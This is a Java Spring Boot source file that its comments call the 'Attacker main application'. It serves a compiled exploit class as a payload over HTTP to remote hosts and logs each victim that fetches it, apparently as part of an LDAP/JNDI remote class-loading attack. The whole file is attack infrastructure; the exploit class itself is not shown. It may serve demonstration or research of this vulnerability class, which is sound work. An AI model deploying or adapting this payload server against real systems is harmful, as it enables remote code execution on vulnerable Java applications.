/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.   
 */

package com.pasam.hacker;

import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

/**
 * Attacker main application. This servers the exploit Java class as payload
 * over HTTP interface. It also starts the in-memory LDAP server for the initial
 * LDAP request.
 *
 * @author Seshu Pasam
 */
@SpringBootApplication
@Configuration
@EnableWebMvc
public class Server implements WebMvcConfigurer {
  private static final Logger log = LoggerFactory.getLogger(Server.class);
  private static final SimpleDateFormat SDF = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");

  public static void main(String[] args) {
    log.error("Hacker server starting");
    SpringApplication.run(Server.class, args);
  }

  public void addInterceptors(InterceptorRegistry registry) {
    registry.addInterceptor(new HandlerInterceptor() {
      @Override
      public void afterCompletion(HttpServletRequest req, HttpServletResponse res, Object handler, Exception ex)
          throws Exception {
        // Log details about the remote location requesting the payload class file
        System.out.println(SDF.format(new Date()) + " INFO --- Sending exploit class to: " + req.getRemoteHost() + ":"
            + req.getRemotePort() + ": " + req.getRequestURI());
      }
    });
  }

  @Override
  public void addResourceHandlers(ResourceHandlerRegistry registry) {
    try {
      // Configure the location to serve the Java class files from
      String classes = new File("target/classes/").getCanonicalPath();
      String location = Paths.get(classes).toUri().toString();
      registry.addResourceHandler("/*.class").addResourceLocations(location);
    } catch (IOException e) {
      throw new RuntimeException(e);
    }
  }
}
